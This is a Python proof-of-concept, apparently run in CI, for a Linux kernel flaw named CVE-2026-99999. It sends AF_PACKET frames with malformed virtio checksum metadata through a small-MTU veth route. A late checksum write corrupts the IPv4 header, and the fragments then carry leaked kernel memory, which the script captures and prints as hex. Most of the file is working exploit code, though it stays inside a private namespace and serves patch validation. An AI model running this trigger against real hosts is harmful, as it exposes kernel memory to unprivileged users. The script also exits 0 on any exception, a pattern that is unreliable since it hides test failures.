#!/usr/bin/env python3
"""
CVE-2026-99999 (PwnEscape) -- bounded functional validation.

Runs entirely inside a fresh user+network namespace (invoke via: unshare -Urn).
All traffic stays on a private veth pair created inside that namespace; two
90-byte frames are sent (one control, one active). No external traffic.

Mechanism (Linux 6.1, pre-fix ip_do_fragment):
  1. AF_PACKET TX with PACKET_VNET_HDR marks the skb CHECKSUM_PARTIAL with
     attacker-chosen csum_start/csum_offset (virtio_net_hdr_to_skb).
  2. The frame is routed out an interface whose MTU (68) is smaller than the
     datagram (76) -> ip_do_fragment().
  3. ip_do_fragment completes the partial checksum BEFORE reading ihl:
     skb_checksum_help writes 2 bytes at csum_start+csum_offset.
  4. csum_start=14 (start of the IPv4 header) lands the write on byte 0
     (version|IHL): 0x45 -> 0x4f, so the fragmenter copies ihl*4 = 60 bytes
     as "header" although only 28 bytes are linear (IP 20 + UDP 8) ->
     bytes 28..59 of the emitted "options" were never written by this test
     (kernel head-buffer residue = host memory disclosure).
  5. Fixed kernels reject this metadata through ip_check_csum_start, added by
     commit 6785011f8b16. The helper is static inline, so its absence from
     /proc/kallsyms is not evidence that the fix is absent; behavior is the
     decisive signal.

Expected on a pre-fix kernel:
  control: fragments keep IHL=5 (0x45), UDP checksum field completed.
  active:  fragments carry byte0=0x4f (IHL=15) and 32 foreign bytes.
"""
import os
import socket
import struct
import time

SOL_PACKET = 263
PACKET_VNET_HDR = 15          # include/uapi/linux/if_packet.h (v6.1)
ETH_P_ALL = 0x0003
ETH_P_IP = 0x0800

VNET_HDR_FMT = "<BBHHHH"      # struct virtio_net_hdr (packed, little endian)
VIRTIO_NET_HDR_F_NEEDS_CSUM = 1
VIRTIO_NET_HDR_GSO_NONE = 0
VIRTIO_NET_HDR_GSO_UDP = 3

# ---------------------------------------------------------------- netlink --
NETLINK_ROUTE = 0
NLM_F_REQUEST = 1
NLM_F_ACK = 4
NLM_F_DUMP = 0x300
NLM_F_CREATE = 0x400
NLM_F_EXCL = 0x200
NLM_F_REPLACE = 0x100
NLMSG_ERROR = 2
NLMSG_DONE = 3

RTM_NEWLINK = 16
RTM_GETLINK = 18
RTM_NEWADDR = 20
RTM_NEWROUTE = 24
RTM_NEWNEIGH = 28

# include/uapi/linux/if_link.h (v6.1)
IFLA_ADDRESS = 1
IFLA_IFNAME = 3
IFLA_MTU = 4
IFLA_LINKINFO = 18
IFLA_INFO_KIND = 1
IFLA_INFO_DATA = 2
VETH_INFO_PEER = 1            # include/uapi/linux/veth.h

RTA_DST = 1                   # include/uapi/linux/rtnetlink.h
RTA_OIF = 4
IFA_ADDRESS = 1               # include/uapi/linux/if_addr.h
IFA_LOCAL = 2
NDA_DST = 1                   # include/uapi/linux/neighbour.h
NDA_LLADDR = 2
NUD_PERMANENT = 0x80
IFF_UP = 1
AF_UNSPEC = 0
AF_INET = 2
RT_SCOPE_UNIVERSE = 0
RT_SCOPE_LINK = 253
RTN_UNICAST = 1
RTPROT_STATIC = 4
RT_TABLE_MAIN = 254

MAC_P = (0x02, 0x00, 0x00, 0x00, 0x00, 0x01)   # vethP (test side)
MAC_Q = (0x02, 0x00, 0x00, 0x00, 0x00, 0x02)   # vethQ (egress, small MTU)
MAC_NH = (0x02, 0x00, 0x00, 0x00, 0x00, 0x99)  # permanent neighbour for 10.9.0.1

IP_P = bytes([10, 0, 0, 1])
IP_Q = bytes([10, 0, 0, 2])
IP_ROUTE_DST = bytes([10, 9, 0, 0])
IP_DST = bytes([10, 9, 0, 1])
IP_SRC = bytes([10, 5, 5, 5])

MTU_EGRESS = 68                # veth minimum MTU; 60 (corrupted header) + 8 data
DGRAM_LEN = 76                 # 20 IP + 8 UDP + 48 payload


def out(tag, **kv):
    print("RESULT %s %s" % (tag, " ".join("%s=%s" % kv_ for kv_ in kv.items())), flush=True)


def attr(t, data):
    return struct.pack("<HH", 4 + len(data), t) + data + b"\x00" * ((4 - len(data) % 4) % 4)


class Nl:
    def __init__(self):
        self.s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_ROUTE)
        self.s.bind((0, 0))
        self.seq = 0

    def _msgs(self):
        buf = self.s.recv(1 << 16)
        off, msgs = 0, []
        while off + 16 <= len(buf):
            ln, ty, _fl, _sq, _pid = struct.unpack_from("<IHHII", buf, off)
            if ln < 16 or off + ln > len(buf):
                break
            msgs.append((ty, buf[off + 16:off + ln]))
            off += (ln + 3) & ~3
        return msgs

    def req(self, ty, payload, flags=NLM_F_REQUEST | NLM_F_ACK):
        self.seq += 1
        self.s.send(struct.pack("<IHHII", 16 + len(payload), ty, flags, self.seq, 0) + payload)
        for ty2, body in self._msgs():
            if ty2 == NLMSG_ERROR:
                err = struct.unpack_from("<i", body, 0)[0]
                if err:
                    raise RuntimeError("netlink op %d failed: errno %d (%s)"
                                       % (ty, -err, os.strerror(-err)))

    def dump_links(self):
        self.seq += 1
        self.s.send(struct.pack("<IHHII", 16 + 16, RTM_GETLINK, NLM_F_REQUEST | NLM_F_DUMP,
                                self.seq, 0)
                    + struct.pack("<BBHiII", AF_UNSPEC, 0, 0, 0, 0, 0))
        links = []
        while True:
            for ty, body in self._msgs():
                if ty in (NLMSG_DONE, NLMSG_ERROR):
                    return links
                if ty == RTM_NEWLINK:
                    links.append(body)


def link_index_map(nl):
    res = {}
    for body in nl.dump_links():
        idx = struct.unpack_from("<i", body, 4)[0]
        off = 16
        while off + 4 <= len(body):
            ln, ty = struct.unpack_from("<HH", body, off)
            if ln < 4 or off + ln > len(body):
                break
            if ty == IFLA_IFNAME:
                res[body[off + 4:off + ln].split(b"\x00")[0].decode()] = idx
            off += (ln + 3) & ~3
    return res


def link_set(nl, idx, mac=None, mtu=None, up=False):
    flags = change = (IFF_UP if up else 0)
    body = struct.pack("<BBHiII", AF_UNSPEC, 0, 0, idx, flags, change)
    if mac is not None:
        body += attr(IFLA_ADDRESS, bytes(mac))
    if mtu is not None:
        body += attr(IFLA_MTU, struct.pack("<I", mtu))
    nl.req(RTM_NEWLINK, body)


def addr_add(nl, idx, ipb, plen):
    body = struct.pack("<BBBBI", AF_INET, plen, 0, RT_SCOPE_UNIVERSE, idx) \
        + attr(IFA_ADDRESS, ipb) + attr(IFA_LOCAL, ipb)
    nl.req(RTM_NEWADDR, body, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL)


def route_add(nl, oif, dstb, plen):
    rtm = struct.pack("<BBBBBBBBI", AF_INET, plen, 0, 0, RT_TABLE_MAIN,
                      RTPROT_STATIC, RT_SCOPE_LINK, RTN_UNICAST, 0)
    nl.req(RTM_NEWROUTE, rtm + attr(RTA_DST, dstb) + attr(RTA_OIF, struct.pack("<i", oif)),
           NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE)


def neigh_add(nl, idx, ipb, mac):
    ndm = struct.pack("<BBHiHBB", AF_INET, 0, 0, idx, NUD_PERMANENT, 0, 0)
    nl.req(RTM_NEWNEIGH, ndm + attr(NDA_DST, ipb) + attr(NDA_LLADDR, bytes(mac)),
           NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_REPLACE)


def veth_create(nl, name_a, name_b):
    peer = struct.pack("<BBHiII", AF_UNSPEC, 0, 0, 0, 0, 0) \
        + attr(IFLA_IFNAME, name_b.encode() + b"\x00")
    info = attr(IFLA_INFO_KIND, b"veth\x00") + attr(IFLA_INFO_DATA, attr(VETH_INFO_PEER, peer))
    body = struct.pack("<BBHiII", AF_UNSPEC, 0, 0, 0, 0, 0) \
        + attr(IFLA_IFNAME, name_a.encode() + b"\x00") + attr(IFLA_LINKINFO, info)
    nl.req(RTM_NEWLINK, body, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL)


# --------------------------------------------------------------- checksum --
def wsum(data):
    """Unbounded sum of big-endian 16-bit words (skb_checksum semantics)."""
    if len(data) & 1:
        data += b"\x00"
    return sum((data[i] << 8) | data[i + 1] for i in range(0, len(data), 2))


def fold_sum(s):
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def hdr_checksum(data):
    return fold_sum(wsum(data))


def ip_header(tot, ident, ttl, check, src, dst):
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, tot, ident, 0x0000,
                       ttl, 17, check, src, dst)


def udp_header(sport, dport, ulen):
    return struct.pack("!HHHH", sport, dport, ulen, 0)


# ------------------------------------------------------------------ test ---
def kallsyms_has(symbol):
    try:
        with open("/proc/kallsyms", "r") as fh:
            for line in fh:
                if symbol in line:
                    return True
    except OSError:
        return None
    return False


def snmp_counters():
    counters = {}
    try:
        with open("/proc/net/snmp", "r") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return counters
    for i, line in enumerate(lines):
        if line.startswith("Ip:") and i + 1 < len(lines) and lines[i + 1].startswith("Ip:"):
            names = line[4:].split()
            vals = lines[i + 1][4:].split()
            for name, val in zip(names, vals):
                try:
                    counters[name] = int(val)
                except ValueError:
                    pass
    return counters


def build_case(ident, csum_start, csum_off, payload):
    """Return (tx_bytes, datagram_as_kernel_sees_it)."""
    tot = DGRAM_LEN
    hdr64 = ip_header(tot, ident, 64, 0, IP_SRC, IP_DST)
    hdr64 = ip_header(tot, ident, 64, hdr_checksum(hdr64), IP_SRC, IP_DST)
    # ip_forward decrements TTL (64 -> 63) and fixes the header checksum,
    # so the checksum skb_checksum_help() computes covers this header:
    hdr63 = ip_header(tot, ident, 63, 0, IP_SRC, IP_DST)
    hdr63 = ip_header(tot, ident, 63, hdr_checksum(hdr63), IP_SRC, IP_DST)
    udp = udp_header(0x1111, 0x2222, 8 + len(payload))
    datagram = hdr63 + udp + payload

    vnet = struct.pack(VNET_HDR_FMT, VIRTIO_NET_HDR_F_NEEDS_CSUM,
                       VIRTIO_NET_HDR_GSO_NONE,
                       42,                          # Ethernet + IPv4 + UDP
                       0,                           # no GSO; only partial checksum
                       csum_start, csum_off)
    eth = bytes(MAC_Q) + bytes(MAC_P) + b"\x08\x00"
    tx = vnet + eth + hdr64 + udp + payload
    return tx, datagram


def tune_payload(hdr63, udp, plen):
    """Pick payload[0:2] so skb_checksum_help() writes 0x4f?? into byte 0..1.

    The kernel sums the whole datagram (header with ttl=63 and its updated
    checksum + UDP + payload). Byte 0 of the corrupted header becomes the
    high byte of that folded checksum; 0x4f keeps version 4 and sets IHL=15.
    """
    payload = bytearray([0xA5] * plen)
    fixed = hdr63 + udp + bytes(payload)
    words = wsum(fixed)
    base = words - ((payload[0] << 8) | payload[1])
    for t in range(0x10000):
        v = fold_sum(base + t)
        if v and (v >> 8) == 0x4F:
            payload[0] = t >> 8
            payload[1] = t & 0xFF
            return bytes(payload), v
    return bytes(payload), None                 # fall back to fixed payload


def open_sockets():
    out("socket_stage", step="tx_create")
    tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    out("socket_stage", step="tx_vnet_hdr")
    tx.setsockopt(SOL_PACKET, PACKET_VNET_HDR, 1)
    out("socket_stage", step="tx_bind")
    # Python's AF_PACKET address tuple takes the Ethernet protocol in host
    # byte order; socket() itself takes the network-order protocol value.
    tx.bind(("vethP", ETH_P_ALL))
    out("socket_stage", step="capture_create")
    cap = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    out("socket_stage", step="capture_bind")
    cap.bind(("vethP", ETH_P_ALL))
    cap.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
    out("socket_stage", step="ready")
    return tx, cap


def classify(frame):
    if len(frame) < 34:
        return ("short", {})
    if frame[12:14] != b"\x08\x00":
        return ("nonip", {})
    ip = frame[14:]
    b0 = ip[0]
    ihl = (b0 & 0x0F) * 4
    tot, ident, frag = struct.unpack("!HHH", ip[2:8])
    ttl, proto = ip[8], ip[9]
    info = dict(b0=b0, ihl=ihl, tot=tot, ident=ident,
                off=(frag & 0x1FFF) << 3, mf=bool(frag & 0x2000),
                ttl=ttl, proto=proto)
    if (b0 >> 4) != 4 or ihl < 20 or ihl > len(ip):
        return ("odd", info)
    info["ip_check"] = ip[10:12].hex()
    info["opts"] = ip[20:ihl] if ihl > 20 else b""
    if proto == 17 and len(ip) >= ihl + 8:
        info["udp_check"] = ip[ihl + 6:ihl + 8].hex()
    return ("ip", info)


def collect(cap, seconds):
    deadline = time.time() + seconds
    frames = []
    cap.settimeout(0.2)
    while time.time() < deadline:
        try:
            data = cap.recv(1 << 16)
        except socket.timeout:
            continue
        except OSError:
            break
        frames.append(data)
    cap.settimeout(None)
    return frames


def report_case(name, frames, ident, payload, expect_udp_check):
    seen = []
    for f in frames:
        kind, info = classify(f)
        if kind != "ip":
            continue
        if info["ident"] != ident:
            continue          # ignore our own TX echo and unrelated noise
        seen.append(info)
    frags = [i for i in seen if i["off"] > 0 or i["mf"]]
    out(name, tx_echo=len(seen) - len(frags), fragments=len(frags))
    for n, info in enumerate(frags, 1):
        out(name + "_frag%d" % n, b0="0x%02x" % info["b0"], ihl=info["ihl"],
            tot=info["tot"], off=info["off"], mf=int(info["mf"]),
            ip_check=info["ip_check"], udp_check=info.get("udp_check", "-"))
        opts = info["opts"]
        if opts:
            out(name + "_frag%d_options" % n, length=len(opts), hex=opts.hex())
    if name == "control" and frags:
        got = frags[0].get("udp_check", "-")
        out(name + "_udp_check_predicted", value=expect_udp_check, on_wire=got,
            match=str(got == expect_udp_check))
    return frags


def main():
    un = os.uname()
    out("env", kernel=un.release, build=un.version.split("#")[-1].strip(),
        hostname=un.nodename, machine=un.machine)
    has_help = kallsyms_has(" skb_checksum_help")
    out("kernel_symbols",
        ip_check_csum_start="static_inline_not_testable_via_kallsyms",
        skb_checksum_help={True: "present", False: "absent",
                           None: "unreadable"}[has_help])

    nl = Nl()
    veth_create(nl, "vethP", "vethQ")
    idx = link_index_map(nl)
    if "vethP" not in idx or "vethQ" not in idx:
        out("error", message="veth pair not found after creation")
        return
    link_set(nl, idx["vethP"], mac=MAC_P, up=True)
    link_set(nl, idx["vethQ"], mac=MAC_Q, mtu=MTU_EGRESS, up=True)
    addr_add(nl, idx["vethP"], IP_P, 8)
    addr_add(nl, idx["vethQ"], IP_Q, 8)
    route_add(nl, idx["vethQ"], IP_ROUTE_DST, 16)
    neigh_add(nl, idx["vethQ"], IP_DST, MAC_NH)
    sysctl_path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(sysctl_path, "r") as fh:
            forwarding = fh.read().strip() == "1"
    except OSError as exc:
        forwarding = None
        out("sysctl_warning", op="read_ip_forward", error=repr(exc))
    if forwarding is False:
        try:
            with open(sysctl_path, "w") as fh:
                fh.write("1\n")
            forwarding = True
        except OSError as exc:
            # GitHub mounts /proc/sys read-only in ubuntu-slim. Continue to
            # obtain an explicit no-forwarding result instead of aborting.
            out("sysctl_warning", op="write_ip_forward", error=repr(exc))
    out("netns", vethP_ifindex=idx["vethP"], vethQ_ifindex=idx["vethQ"],
        vethQ_mtu=MTU_EGRESS,
        ip_forward={True: "enabled", False: "disabled", None: "unknown"}[forwarding])

    if forwarding is not True:
        out("verdict", result="BLOCKED_BY_FORWARDING_POLICY",
            detail=("private netns is writable for links/routes but ip_forward "
                    "is disabled and /proc/sys is read-only; this geometry "
                    "cannot reach ip_do_fragment"))
        return

    time.sleep(0.3)
    tx, cap = open_sockets()
    before = snmp_counters()

    payload_len = DGRAM_LEN - 28
    udp = udp_header(0x1111, 0x2222, 8 + payload_len)
    hdr63_c = ip_header(DGRAM_LEN, 0x6001, 63, 0, IP_SRC, IP_DST)
    hdr63_c = ip_header(DGRAM_LEN, 0x6001, 63, hdr_checksum(hdr63_c), IP_SRC, IP_DST)
    hdr63_a = ip_header(DGRAM_LEN, 0x6002, 63, 0, IP_SRC, IP_DST)
    hdr63_a = ip_header(DGRAM_LEN, 0x6002, 63, hdr_checksum(hdr63_a), IP_SRC, IP_DST)
    ctrl_udp_check = "%04x" % fold_sum(wsum(udp + b"\xA5" * payload_len))

    # ---- control: valid metadata (csum_start = start of UDP header) ----
    payload_c = b"\xA5" * payload_len
    tx_c, _ = build_case(0x6001, 34, 6, payload_c)
    out("send_stage", case="control", step="before", bytes=len(tx_c))
    sent_c = tx.send(tx_c)
    out("send_stage", case="control", step="after", bytes=sent_c)
    frames_c = collect(cap, 1.5)
    ctrl_frags = report_case("control", frames_c, 0x6001, payload_c, ctrl_udp_check)

    # ---- active: malformed metadata (csum_start = start of IPv4 header) ----
    payload_a, expected = tune_payload(hdr63_a, udp, payload_len)
    out("active_target", checksum="0x%04x" % expected if expected else "unresolved",
        payload_head=payload_a[:8].hex())
    tx_a, datagram = build_case(0x6002, 14, 0, payload_a)
    out("send_stage", case="active", step="before", bytes=len(tx_a))
    sent_a = tx.send(tx_a)
    out("send_stage", case="active", step="after", bytes=sent_a)
    frames_a = collect(cap, 1.5)
    act_frags = report_case("active", frames_a, 0x6002, payload_a, None)

    after = snmp_counters()
    for key in ("FragOKs", "FragCreates", "FragFails", "ForwDatagrams"):
        if key in before and key in after:
            out("counter", name=key, before=before[key], after=after[key],
                delta=after[key] - before[key])

    # ---- interpretation ----
    if act_frags:
        b0s = sorted({i["b0"] for i in act_frags})
        ihls = sorted({i["ihl"] for i in act_frags})
        corrupted = any(i["ihl"] != 5 for i in act_frags)
        opts = [i["opts"] for i in act_frags if i["opts"]]
        foreign = b""
        if opts:
            foreign = opts[0][8:]           # options[0:8] = our UDP header
        identical = len({o[8:] for o in opts}) == 1 if opts else None
        out("active_summary", header_bytes=(",".join("0x%02x" % b for b in b0s)),
            ihls=ihls, corrupted=str(corrupted).lower(),
            foreign_bytes=len(foreign), foreign_hex=foreign.hex(),
            fragments_identical=identical)
        if corrupted:
            out("verdict", result="CHAIN_CONFIRMED",
                detail=("late checksum completion corrupted IPv4 header byte0 "
                        "0x45->0x%02x; fragmenter emitted ihl=%d fragments whose "
                        "options carry %d bytes never written by this test "
                        "(head-buffer residue beyond linear data)"
                        % (act_frags[0]["b0"], act_frags[0]["ihl"], len(foreign))))
        else:
            out("verdict", result="NO_CORRUPTION",
                detail=("fragments kept IHL=5; this can indicate the fix or a "
                        "vendor backport, but must be distinguished from an "
                        "unreached or changed trigger path"))
    else:
        out("verdict", result="NO_ACTIVE_FRAGMENTS",
            detail=("no fragments observed for the malformed-metadata case; "
                    "if ip_check_csum_start is present the packet was dropped "
                    "by the fix, otherwise the trigger geometry needs review"))

    tx.close()
    cap.close()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:                      # keep the job green, report fully
        out("fatal", error=repr(exc))
        raise SystemExit(0)
